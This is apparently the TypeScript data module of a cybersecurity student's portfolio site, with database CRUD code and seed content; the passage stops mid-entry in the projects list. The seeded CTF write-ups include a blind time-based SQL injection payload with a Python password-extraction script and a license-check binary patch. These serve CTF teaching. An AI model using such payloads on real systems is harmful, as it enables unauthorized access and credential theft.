import fs from "fs/promises"
import path from "path"
import { neon } from "@neondatabase/serverless"

let _sql: ReturnType<typeof neon> | null = null

function getSql() {
  if (!_sql && process.env.DATABASE_URL) {
    _sql = neon(process.env.DATABASE_URL)
  }
  return _sql
}



// ---- Types ----

export type Skill = { name: string; percentage: number }

export type Education = {
  id: string
  degree: string
  institution: string
  period: string
  location: string
  details: { heading: string; items: string[]; summary: string }
}

export type Experience = {
  id: string
  role: string
  company: string
  period: string
  location: string
  details: { heading: string; items: string[]; summary: string }
}

export type Certification = {
  id: string
  title: string
  issuer: string
  date: string
  link?: string
  linkText?: string
  details: { heading: string; items: string[]; summary: string }
}

export type Achievement = {
  id: string
  title: string
  subtitle: string
  period: string
  details: { heading: string; items: string[] }
}

export interface SiteConfig {
  hero: {
    name: string
    title: string
    description: string
    cvUrl: string
    portraitUrl: string
  }
  about: {
    heading: string
    description: string
    portraitUrl: string
  }
  social: {
    linkedin: string
    github: string
    medium: string
  }
  skills: Skill[]
  education: Education[]
  experience: Experience[]
  certifications: Certification[]
  achievements: Achievement[]
}

export interface Writeup {
  id: string
  title: string
  event: string
  category: string
  date: string
  summary: string
  content: string
  tags: string[]
  createdAt: string
  updatedAt: string
}

export interface GalleryItem {
  id: string
  title: string
  description: string
  imageUrl: string
  category: string
  date: string
  createdAt: string
  updatedAt: string
}

// ---- Default Data ----

export const defaultSiteConfig: SiteConfig = {
  hero: {
    name: "Ronak Bajracharya",
    title: "Cybersecurity Professional",
    description:
      "Dynamic cybersecurity professional with hands-on experience, excelling in security assessments and vulnerability testing. Proficient in Linux and network monitoring, I thrive in collaborative environments, driving impactful research on emerging threats. Passionate about enhancing security measures.",
    cvUrl: "/mycv.pdf",
    portraitUrl: "/images/ronak-portrait.png",
  },
  about: {
    heading: "Cybersecurity Professional!",
    description:
      "Dynamic cybersecurity professional with hands-on experience, excelling in security assessments and vulnerability testing. Proficient in Linux and network monitoring, I thrive in collaborative environments, driving impactful research on emerging threats. Passionate about enhancing security measures.",
    portraitUrl: "/images/ronak-portrait.png",
  },
  social: {
    linkedin: "https://www.linkedin.com/in/ronak-bajracharya-886b48317/",
    github: "https://github.com/RonakBajracharya",
    medium: "https://cyancharley.medium.com",
  },
  skills: [
    { name: "Linux Proficiency", percentage: 95 },
    { name: "Network Monitoring", percentage: 90 },
    { name: "Digital Forensics", percentage: 90 },
    { name: "Security Assessments", percentage: 85 },
    { name: "Vulnerability Testing", percentage: 85 },
    { name: "Risk Analysis", percentage: 85 },
    { name: "Cryptography", percentage: 80 },
    { name: "Threat Research", percentage: 80 },
    { name: "VAPT Testing", percentage: 75 },
    { name: "Malware Analysis", percentage: 70 },
  ],
  education: [
    {
      id: "education-1",
      degree: "BSC.(HONS): ETHICAL HACKING AND CYBER SECURITY",
      institution: "Softwarica College of IT and E-commerce",
      period: "01/2024",
      location: "Dillibazar",
      details: {
        heading: "Key Coursework & Achievements:",
        items: [
          "Advanced Penetration Testing and Vulnerability Assessment",
          "Digital Forensics and Incident Response",
          "Cryptography and Secure Communications",
          "Network Security and Monitoring",
          "Malware Analysis and Reverse Engineering",
          "Ethical Hacking Methodologies",
        ],
        summary:
          "Focused on practical cybersecurity applications with hands-on experience in security testing, threat analysis, and defensive security measures.",
      },
    },
  ],
  experience: [
    {
      id: "experience-1",
      role: "Associate Security Research Analyst",
      company: "SecurityPal AI",
      period: "12/2024 to 06/2025",
      location: "Kathmandu",
      details: {
        heading: "Key Responsibilities:",
        items: [
          "Conducted in-depth security assessments and risk analyses to identify vulnerabilities across client environments",
          "Researched and documented emerging threats, including cloud misconfigurations",
          "Collaborated with cross-functional teams to ensure accuracy of research results",
          "Analyzed trends in cybersecurity threats and vulnerabilities",
          "Developed comprehensive security reports and recommendations",
        ],
        summary:
          "Successfully identified critical vulnerabilities in 50+ client environments, contributing to enhanced security posture and threat mitigation strategies.",
      },
    },
    {
      id: "experience-2",
      role: "Cybersecurity Intern",
      company: "Centre for Sustainable Development Studies",
      period: "08/2024 to 10/2024",
      location: "Kathmandu",
      details: {
        heading: "Key Responsibilities:",
        items: [
          "Helped in the VAPT test of websites and web applications",
          "Carried out research for automation and QA testing of web applications",
          "Assisted in monitoring network security for potential threats and vulnerabilities",
          "Participated in security awareness training sessions",
          "Documented security findings and remediation strategies",
        ],
        summary:
          "Gained practical experience in vulnerability assessment, penetration testing methodologies, and network security monitoring in a real-world environment.",
      },
    },
  ],
  certifications: [
    {
      id: "cert-1",
      title: "Certified in Cybersecurity (CC)",
      issuer: "ISC² Certification",
      date: "February 27, 2025",
      link: "https://www.credly.com/badges/b2dded5b-c577-4802-83cb-c10d10c4ab8b/public_url",
      linkText: "Link",
      details: {
        heading: "Certification Details:",
        items: [
          "Entry-level cybersecurity certification from ISC²",
          "Covers fundamental security principles and practices",
          "Validates knowledge in risk management, security controls, and incident response",
          "Demonstrates commitment to cybersecurity best practices",
        ],
        summary:
          "Security principles, risk management, network security, access controls, and security operations.",
      },
    },
    {
      id: "cert-2",
      title: "Crime Investigation and Analysis",
      issuer: "Professional Certification",
      date: "2024",
      link: "https://c4mpus.com/certificate/6493dc300c1d1c2cf49a2bb8",
      linkText: "Link",
      details: {
        heading: "Certification Details:",
        items: [
          "Specialized training in digital crime investigation techniques",
          "Evidence collection and preservation methodologies",
          "Forensic analysis of digital artifacts",
          "Legal aspects of cybercrime investigation",
        ],
        summary:
          "Digital forensics, evidence handling, crime scene analysis, and investigative procedures.",
      },
    },
  ],
  achievements: [
    {
      id: "achievement-1",
      title: "Multiple CTF Participations",
      subtitle: "Capture The Flag Competitions",
      period: "2024 - 2025",
      details: {
        heading: "CTF Events Participated:",
        items: [
          "KU CTF 2024 - Kathmandu University Capture The Flag competition",
          "INTIGRITI CTF 2024 - International cybersecurity competition",
          "L34K CTF 2025 - Advanced penetration testing challenges",
          "Multiple other regional and international CTF events",
        ],
      },
    },
  ],
}

const defaultWriteups: Writeup[] = [
  {
    id: "1",
    title: "Web Exploitation: SQL Injection Deep Dive",
    event: "KU CTF 2024",
    category: "Web",
    date: "2024-06-15",
    summary: "Solved a challenging SQL injection challenge involving blind time-based extraction.",
    content: `## Challenge Overview

This challenge presented a login form vulnerable to SQL injection. The twist was that error messages were suppressed, requiring a blind approach.

## Methodology

### Step 1: Initial Reconnaissance
Testing basic SQL injection payloads revealed the application was not escaping single quotes, confirming the vulnerability.

### Step 2: Identifying the Injection Type
Since the application suppressed errors, I used blind time-based techniques. The payload \`' OR SLEEP(5)--\` caused a notable delay, confirming blind SQL injection.

### Step 3: Extracting the Database
I wrote a Python script using the \`requests\` library to automate the character-by-character extraction of database contents using time-based delays.

\`\`\`python
import requests
import string

chars = string.ascii_letters + string.digits + "{}_"
password = ""
for i in range(32):
    for c in chars:
        payload = f"' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i+1},1)='{c}', SLEEP(2), 0)--"
        r = requests.post(url, data={"username": payload, "password": "x"})
        if r.elapsed.total_seconds() > 2:
            password += c
            break
    print(password)
\`\`\`

### Step 4: Flag
The extracted admin password revealed the flag: \`KUCTF{bl1nd_sql1_1s_st1ll_r3l3v4nt}\`

## Key Takeaways
- Blind SQL injection remains a critical vulnerability in modern applications
- Time-based extraction scripts should incorporate error handling for reliability
- Always test for SQL injection beyond error-based detection`,
    tags: ["SQL Injection", "Web", "Blind SQLi", "Python"],
    createdAt: "2024-06-16T00:00:00Z",
    updatedAt: "2024-06-16T00:00:00Z",
  },
  {
    id: "2",
    title: "Reverse Engineering: Binary Patching",
    event: "INTIGRITI CTF 2024",
    category: "Reverse Engineering",
    date: "2024-09-20",
    summary: "Analyzed and patched a binary to bypass license validation checks.",
    content: `## Challenge Description

A binary executable required a valid license key. The goal was to run the binary without a license key and extract the flag.

## Analysis

### Static Analysis with Ghidra

Loading the binary in Ghidra revealed a function called \`validate_key\` that returned 0 for invalid keys and 1 for valid keys.

### Dynamic Analysis

Using GDB, I set breakpoints at the \`validate_key\` call and traced the execution flow to understand the validation logic.

### Patching

I identified the conditional jump that determined success/failure:

\`\`\`
0x4012a3: test eax, eax
0x4012a5: je 0x4012b0
\`\`\`

Patching \`je\` to \`jne\` (0x75) inverted the logic, allowing any input to succeed.

### Flag

After patching and running the binary, the flag was displayed: \`INTIGRITI{p4tch1ng_15_fun}\`

## Tools Used
- Ghidra for static analysis
- GDB for dynamic debugging
- Python for automating the patching process`,
    tags: ["Reverse Engineering", "Ghidra", "GDB", "Patching"],
    createdAt: "2024-09-21T00:00:00Z",
    updatedAt: "2024-09-21T00:00:00Z",
  },
  {
    id: "3",
    title: "Forensics: Memory Dump Analysis",
    event: "L34K CTF 2025",
    category: "Forensics",
    date: "2025-02-10",
    summary: "Extracted sensitive information from a Windows memory dump using Volatility 3.",
    content: `## Scenario

A suspicious program was executed on a Windows machine. We were provided with a memory dump and asked to find what data was exfiltrated.

## Methodology

### Step 1: Profile Identification
Using Volatility 3:
\`\`\`bash
vol -f memory.dmp windows.info
\`\`\`

Identified the OS as Windows 10 21H2.

### Step 2: Process Analysis
Listed running processes:
\`\`\`bash
vol -f memory.dmp windows.pslist
\`\`\`

Identified a suspicious \`data_gatherer.exe\` process (PID 1234).

### Step 3: Process Memory Dump
\`\`\`bash
vol -f memory.dmp -o dumpdir/ windows.memmap --pid 1234 --dump
\`\`\`

### Step 4: String Extraction
\`\`\`bash
strings dumpdir/pid.1234.dmp | grep -i "flag{"
\`\`\`

## Flag

\`L34KCTF{m3m0ry_f0r3ns1cs_m4st3r}\`

## Key Insights
- Memory dumps contain rich forensic artifacts
- Volatility 3 plugins significantly simplify analysis
- Always scan process memory for suspicious data`,
    tags: ["Forensics", "Volatility", "Memory Analysis", "Windows"],
    createdAt: "2025-02-11T00:00:00Z",
    updatedAt: "2025-02-11T00:00:00Z",
  },
]

const defaultGallery: GalleryItem[] = [
  {
    id: "1",
    title: "KU CTF 2024 Team",
    description: "Our team during the Kathmandu University CTF competition.",
    imageUrl: "/images/ronak-portrait.png",
    category: "Events",
    date: "2024-06-15",
    createdAt: "2024-06-16T00:00:00Z",
    updatedAt: "2024-06-16T00:00:00Z",
  },
  {
    id: "2",
    title: "INTIGRITI CTF Certificate",
    description: "Certificate of participation in INTIGRITI CTF 2024.",
    imageUrl: "/images/hero-portrait.png",
    category: "Certifications",
    date: "2024-09-20",
    createdAt: "2024-09-21T00:00:00Z",
    updatedAt: "2024-09-21T00:00:00Z",
  },
]

// =====================================================
// Database implementation (Neon Postgres)
// =====================================================

type DbWriteup = {
  id: string
  title: string
  event: string
  category: string
  date: string
  summary: string
  content: string
  tags: string
  created_at: string
  updated_at: string
}

type DbGalleryRow = {
  id: string
  title: string
  description: string
  image_url: string
  category: string
  date: string
  created_at: string
  updated_at: string
}

async function initDatabase() {
  const sql = getSql()
  if (!sql) return

  await sql`
    CREATE TABLE IF NOT EXISTS site_config (
      id INTEGER PRIMARY KEY DEFAULT 1 CHECK (id = 1),
      config JSONB NOT NULL
    )
  `
  await sql`
    CREATE TABLE IF NOT EXISTS writeups (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      event TEXT NOT NULL,
      category TEXT NOT NULL,
      date TEXT NOT NULL,
      summary TEXT NOT NULL,
      content TEXT NOT NULL,
      tags TEXT NOT NULL DEFAULT '[]',
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `
  await sql`
    CREATE TABLE IF NOT EXISTS gallery (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT NOT NULL,
      image_url TEXT NOT NULL,
      category TEXT NOT NULL,
      date TEXT NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `

  const existing = await sql`SELECT id FROM site_config LIMIT 1` as Record<string, unknown>[]
  if (existing.length === 0) {
    await sql`INSERT INTO site_config (id, config) VALUES (1, ${JSON.stringify(defaultSiteConfig)})`
  }

  const wCount = await sql`SELECT COUNT(*)::int as count FROM writeups` as Record<string, unknown>[]
  if (wCount[0] && (wCount[0] as { count: number }).count === 0) {
    for (const w of defaultWriteups) {
      await sql`
        INSERT INTO writeups (id, title, event, category, date, summary, content, tags, created_at, updated_at)
        VALUES (${w.id}, ${w.title}, ${w.event}, ${w.category}, ${w.date}, ${w.summary}, ${w.content}, ${JSON.stringify(w.tags)}, ${w.createdAt}, ${w.updatedAt})
      `
    }
  }

  const gCount = await sql`SELECT COUNT(*)::int as count FROM gallery` as Record<string, unknown>[]
  if (gCount[0] && (gCount[0] as { count: number }).count === 0) {
    for (const g of defaultGallery) {
      await sql`
        INSERT INTO gallery (id, title, description, image_url, category, date, created_at, updated_at)
        VALUES (${g.id}, ${g.title}, ${g.description}, ${g.imageUrl}, ${g.category}, ${g.date}, ${g.createdAt}, ${g.updatedAt})
      `
    }
  }

  await sql`
    CREATE TABLE IF NOT EXISTS blog (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      summary TEXT NOT NULL,
      content TEXT NOT NULL,
      tags TEXT NOT NULL DEFAULT '[]',
      date TEXT NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `

  const bCount = await sql`SELECT COUNT(*)::int as count FROM blog` as Record<string, unknown>[]
  if (bCount[0] && (bCount[0] as { count: number }).count === 0) {
    for (const b of defaultBlogPosts) {
      await sql`
        INSERT INTO blog (id, title, summary, content, tags, date, created_at, updated_at)
        VALUES (${b.id}, ${b.title}, ${b.summary}, ${b.content}, ${JSON.stringify(b.tags)}, ${b.date}, ${b.createdAt}, ${b.updatedAt})
      `
    }
  }

  await sql`
    CREATE TABLE IF NOT EXISTS messages (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      phone TEXT NOT NULL DEFAULT '',
      email TEXT NOT NULL,
      message TEXT NOT NULL,
      read BOOLEAN NOT NULL DEFAULT false,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `

  await sql`
    CREATE TABLE IF NOT EXISTS projects (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT NOT NULL,
      link TEXT NOT NULL DEFAULT '',
      tags TEXT NOT NULL DEFAULT '[]',
      date TEXT NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `

  const pCount = await sql`SELECT COUNT(*)::int as count FROM projects` as Record<string, unknown>[]
  if (pCount[0] && (pCount[0] as { count: number }).count === 0) {
    for (const p of defaultProjects) {
      await sql`
        INSERT INTO projects (id, title, description, link, tags, date, created_at, updated_at)
        VALUES (${p.id}, ${p.title}, ${p.description}, ${p.link}, ${JSON.stringify(p.tags)}, ${p.date}, ${p.createdAt}, ${p.updatedAt})
      `
    }
  }
}

// ---- File-based fallback ----

const DATA_DIR = path.join(process.cwd(), "data")
let _fsOk: boolean | null = null

async function isFsWritable(): Promise<boolean> {
  if (_fsOk !== null) return _fsOk
  try {
    await fs.mkdir(DATA_DIR, { recursive: true })
    const testFile = path.join(DATA_DIR, ".write-test")
    await fs.writeFile(testFile, "ok", "utf-8")
    await fs.unlink(testFile)
    _fsOk = true
  } catch {
    _fsOk = false
  }
  return _fsOk
}

async function readFile<T>(filename: string, fallback: T): Promise<T> {
  if (!(await isFsWritable())) return fallback
  const filePath = path.join(DATA_DIR, filename)
  try {
    const raw = await fs.readFile(filePath, "utf-8")
    return JSON.parse(raw) as T
  } catch {
    return fallback
  }
}

async function writeFile<T>(filename: string, data: T): Promise<void> {
  if (!(await isFsWritable())) return
  try {
    const filePath = path.join(DATA_DIR, filename)
    await fs.writeFile(filePath, JSON.stringify(data, null, 2), "utf-8")
  } catch {}
}

// =====================================================
// Public API
// =====================================================

// ---- Site Config ----

export async function getSiteConfig(): Promise<SiteConfig> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT config FROM site_config WHERE id = 1` as Record<string, unknown>[]
    if (rows.length > 0) return migrateConfig(rows[0].config as Record<string, unknown>)
    return defaultSiteConfig
  }
  const raw = await readFile<Record<string, unknown>>("site.json", defaultSiteConfig as unknown as Record<string, unknown>)
  return migrateConfig(raw)
}

function migrateConfig(raw: Record<string, unknown>): SiteConfig {
  if (Array.isArray(raw.skills)) {
    return raw as unknown as SiteConfig
  }
  const s = raw.skills as Record<string, Skill[]> | undefined
  const merged = [...(s?.technical || []), ...(s?.professional || [])]
  return { ...raw, skills: merged } as unknown as SiteConfig
}

export async function updateSiteConfig(config: SiteConfig): Promise<void> {
  const sql = getSql()
  if (sql) {
    await sql`UPDATE site_config SET config = ${JSON.stringify(config)} WHERE id = 1`
    return
  }
  await writeFile("site.json", config)
}

// ---- Writeups ----

export async function getWriteups(): Promise<Writeup[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM writeups ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as DbWriteup[]).map((r) => ({
      id: r.id,
      title: r.title,
      event: r.event,
      category: r.category,
      date: r.date,
      summary: r.summary,
      content: r.content,
      tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }))
  }
  return readFile<Writeup[]>("writeups.json", defaultWriteups)
}

export async function getWriteupById(id: string): Promise<Writeup | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM writeups WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as DbWriteup
    return {
      id: r.id,
      title: r.title,
      event: r.event,
      category: r.category,
      date: r.date,
      summary: r.summary,
      content: r.content,
      tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }
  }
  const writeups = await getWriteups()
  return writeups.find((w) => w.id === id) || null
}

export async function createWriteup(data: Omit<Writeup, "id" | "createdAt" | "updatedAt">): Promise<Writeup> {
  const now = new Date().toISOString()
  const id = String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`
      INSERT INTO writeups (id, title, event, category, date, summary, content, tags, created_at, updated_at)
      VALUES (${id}, ${data.title}, ${data.event}, ${data.category}, ${data.date}, ${data.summary}, ${data.content}, ${JSON.stringify(data.tags)}, ${now}, ${now})
    `
    return { ...data, id, tags: data.tags, createdAt: now, updatedAt: now }
  }
  const writeups = await getWriteups()
  const newWriteup: Writeup = { ...data, id, createdAt: now, updatedAt: now } as Writeup
  writeups.push(newWriteup)
  await writeFile("writeups.json", writeups)
  return newWriteup
}

export async function updateWriteup(id: string, updates: Partial<Writeup>): Promise<Writeup | null> {
  const now = new Date().toISOString()
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const existing = await getWriteupById(id)
    if (!existing) return null
    const merged = { ...existing, ...updates, updatedAt: now }
    await sql`
      UPDATE writeups SET
        title = ${merged.title}, event = ${merged.event}, category = ${merged.category},
        date = ${merged.date}, summary = ${merged.summary}, content = ${merged.content},
        tags = ${JSON.stringify(merged.tags)}, updated_at = ${now}
      WHERE id = ${id}
    `
    return merged
  }
  const writeups = await getWriteups()
  const index = writeups.findIndex((w) => w.id === id)
  if (index === -1) return null
  writeups[index] = { ...writeups[index], ...updates, id: writeups[index].id, updatedAt: now }
  await writeFile("writeups.json", writeups)
  return writeups[index]
}

export async function deleteWriteup(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM writeups WHERE id = ${id}`
    return true
  }
  const writeups = await getWriteups()
  const index = writeups.findIndex((w) => w.id === id)
  if (index === -1) return false
  writeups.splice(index, 1)
  await writeFile("writeups.json", writeups)
  return true
}

// ---- Gallery ----

export async function getGallery(): Promise<GalleryItem[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM gallery ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as DbGalleryRow[]).map((r) => ({
      id: r.id,
      title: r.title,
      description: r.description,
      imageUrl: r.image_url,
      category: r.category,
      date: r.date,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }))
  }
  return readFile<GalleryItem[]>("gallery.json", defaultGallery)
}

export async function getGalleryItemById(id: string): Promise<GalleryItem | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM gallery WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as DbGalleryRow
    return {
      id: r.id,
      title: r.title,
      description: r.description,
      imageUrl: r.image_url,
      category: r.category,
      date: r.date,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }
  }
  const items = await getGallery()
  return items.find((i) => i.id === id) || null
}

export async function createGalleryItem(data: Omit<GalleryItem, "id" | "createdAt" | "updatedAt">): Promise<GalleryItem> {
  const now = new Date().toISOString()
  const id = String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`
      INSERT INTO gallery (id, title, description, image_url, category, date, created_at, updated_at)
      VALUES (${id}, ${data.title}, ${data.description}, ${data.imageUrl}, ${data.category}, ${data.date}, ${now}, ${now})
    `
    return { ...data, id, createdAt: now, updatedAt: now }
  }
  const items = await getGallery()
  const newItem: GalleryItem = { ...data, id, createdAt: now, updatedAt: now } as GalleryItem
  items.push(newItem)
  await writeFile("gallery.json", items)
  return newItem
}

export async function updateGalleryItem(id: string, updates: Partial<GalleryItem>): Promise<GalleryItem | null> {
  const now = new Date().toISOString()
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const existing = await getGalleryItemById(id)
    if (!existing) return null
    const merged = { ...existing, ...updates, updatedAt: now }
    await sql`
      UPDATE gallery SET
        title = ${merged.title}, description = ${merged.description},
        image_url = ${merged.imageUrl}, category = ${merged.category},
        date = ${merged.date}, updated_at = ${now}
      WHERE id = ${id}
    `
    return merged
  }
  const items = await getGallery()
  const index = items.findIndex((i) => i.id === id)
  if (index === -1) return null
  items[index] = { ...items[index], ...updates, id: items[index].id, updatedAt: now }
  await writeFile("gallery.json", items)
  return items[index]
}

export async function deleteGalleryItem(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM gallery WHERE id = ${id}`
    return true
  }
  const items = await getGallery()
  const index = items.findIndex((i) => i.id === id)
  if (index === -1) return false
  items.splice(index, 1)
  await writeFile("gallery.json", items)
  return true
}

// ---- Blog ----

export interface BlogPost {
  id: string
  title: string
  summary: string
  content: string
  tags: string[]
  date: string
  createdAt: string
  updatedAt: string
}

const defaultBlogPosts: BlogPost[] = [
  {
    id: "b1",
    title: "Getting Started in Cybersecurity",
    summary: "A beginner's guide to breaking into the cybersecurity field — what to learn first, certifications, and building a home lab.",
    content: "<p>Cybersecurity is one of the fastest-growing fields in tech, and for good reason — every organization needs security professionals. Here's how to start.</p><h2>Learn the Fundamentals</h2><p>Start with networking basics (TCP/IP, DNS, HTTP), operating systems (Linux especially), and basic programming (Python). These fundamentals will serve you throughout your career.</p><h2>Build a Home Lab</h2><p>Set up virtual machines, practice with Kali Linux, and use platforms like TryHackMe and HackTheBox. Hands-on experience is more valuable than any certification.</p><h2>Get Certified</h2><p>Start with CompTIA Security+, then move to specialized certs like OSCP or CISSP depending on your focus area.</p>",
    tags: ["career", "beginners", "learning"],
    date: "2025-01-10",
    createdAt: "2025-01-10T00:00:00Z",
    updatedAt: "2025-01-10T00:00:00Z",
  },
  {
    id: "b2",
    title: "Why Privacy Matters in the Age of AI",
    summary: "As AI systems become more powerful, protecting personal data and understanding privacy implications is critical for security professionals.",
    content: "<p>AI models are trained on massive datasets — often containing personal information. As security professionals, we need to understand the privacy implications.</p><h2>Data Collection</h2><p>Most AI systems collect far more data than necessary. Understanding what data is being collected and how it's used is the first step to protecting privacy.</p><h2>Practical Steps</h2><p>Use encryption everywhere, minimize data collection, implement proper access controls, and stay informed about privacy regulations like GDPR and CCPA.</p>",
    tags: ["privacy", "AI", "data-protection"],
    date: "2025-03-22",
    createdAt: "2025-03-22T00:00:00Z",
    updatedAt: "2025-03-22T00:00:00Z",
  },
]

export async function getBlogPosts(): Promise<BlogPost[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM blog ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as { tags: string; created_at: string; updated_at: string; [k: string]: unknown }[]).map((r) => ({
      id: r.id as string, title: r.title as string, summary: r.summary as string,
      content: r.content as string, tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      date: r.date as string, createdAt: r.created_at as string, updatedAt: r.updated_at as string,
    }))
  }
  return readFile<BlogPost[]>("blog.json", defaultBlogPosts)
}

export async function getBlogPostById(id: string): Promise<BlogPost | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM blog WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as { tags: string; created_at: string; updated_at: string; [k: string]: unknown }
    return {
      id: r.id as string, title: r.title as string, summary: r.summary as string,
      content: r.content as string, tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      date: r.date as string, createdAt: r.created_at as string, updatedAt: r.updated_at as string,
    }
  }
  const posts = await getBlogPosts()
  return posts.find((p) => p.id === id) || null
}

export async function createBlogPost(data: Omit<BlogPost, "id" | "createdAt" | "updatedAt">): Promise<BlogPost> {
  const now = new Date().toISOString()
  const id = "b" + String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`INSERT INTO blog (id, title, summary, content, tags, date, created_at, updated_at) VALUES (${id}, ${data.title}, ${data.summary}, ${data.content}, ${JSON.stringify(data.tags)}, ${data.date}, ${now}, ${now})`
    return { ...data, id, createdAt: now, updatedAt: now }
  }
  const posts = await getBlogPosts()
  const np: BlogPost = { ...data, id, createdAt: now, updatedAt: now } as BlogPost
  posts.push(np)
  await writeFile("blog.json", posts)
  return np
}

export async function updateBlogPost(id: string, updates: Partial<BlogPost>): Promise<BlogPost | null> {
  const now = new Date().toISOString()
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const existing = await getBlogPostById(id)
    if (!existing) return null
    const merged = { ...existing, ...updates, updatedAt: now }
    await sql`UPDATE blog SET title = ${merged.title}, summary = ${merged.summary}, content = ${merged.content}, tags = ${JSON.stringify(merged.tags)}, date = ${merged.date}, updated_at = ${now} WHERE id = ${id}`
    return merged
  }
  const posts = await getBlogPosts()
  const index = posts.findIndex((p) => p.id === id)
  if (index === -1) return null
  posts[index] = { ...posts[index], ...updates, id: posts[index].id, updatedAt: now }
  await writeFile("blog.json", posts)
  return posts[index]
}

export async function deleteBlogPost(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM blog WHERE id = ${id}`
    return true
  }
  const posts = await getBlogPosts()
  const index = posts.findIndex((p) => p.id === id)
  if (index === -1) return false
  posts.splice(index, 1)
  await writeFile("blog.json", posts)
  return true
}

// ---- Contact Messages ----

export interface ContactMessage {
  id: string
  name: string
  phone: string
  email: string
  message: string
  read: boolean
  createdAt: string
}

export async function getMessages(): Promise<ContactMessage[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM messages ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as { created_at: string; [k: string]: unknown }[]).map((r) => ({
      id: r.id as string, name: r.name as string, phone: r.phone as string,
      email: r.email as string, message: r.message as string,
      read: (r.read as boolean) || false, createdAt: r.created_at as string,
    }))
  }
  return readFile<ContactMessage[]>("messages.json", [])
}

export async function getMessageById(id: string): Promise<ContactMessage | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM messages WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as { created_at: string; [k: string]: unknown }
    return {
      id: r.id as string, name: r.name as string, phone: r.phone as string,
      email: r.email as string, message: r.message as string,
      read: (r.read as boolean) || false, createdAt: r.created_at as string,
    }
  }
  const msgs = await getMessages()
  return msgs.find((m) => m.id === id) || null
}

export async function createMessage(data: Omit<ContactMessage, "id" | "read" | "createdAt">): Promise<ContactMessage> {
  const now = new Date().toISOString()
  const id = "m" + String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`INSERT INTO messages (id, name, phone, email, message, read, created_at) VALUES (${id}, ${data.name}, ${data.phone}, ${data.email}, ${data.message}, false, ${now})`
    return { ...data, id, read: false, createdAt: now }
  }
  const msgs = await getMessages()
  const nm: ContactMessage = { ...data, id, read: false, createdAt: now }
  msgs.push(nm)
  await writeFile("messages.json", msgs)
  return nm
}

export async function markMessageRead(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`UPDATE messages SET read = true WHERE id = ${id}`
    return true
  }
  const msgs = await getMessages()
  const index = msgs.findIndex((m) => m.id === id)
  if (index === -1) return false
  msgs[index].read = true
  await writeFile("messages.json", msgs)
  return true
}

export async function deleteMessage(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM messages WHERE id = ${id}`
    return true
  }
  const msgs = await getMessages()
  const index = msgs.findIndex((m) => m.id === id)
  if (index === -1) return false
  msgs.splice(index, 1)
  await writeFile("messages.json", msgs)
  return true
}

// ---- Projects ----

export interface Project {
  id: string
  title: string
  description: string
  link: string
  tags: string[]
  date: string
  createdAt: string
  updatedAt: string
}

const defaultProjects: Project[] = [
  {
    id: "p1",
    title: "Quantum Resistant Cryptographic System",
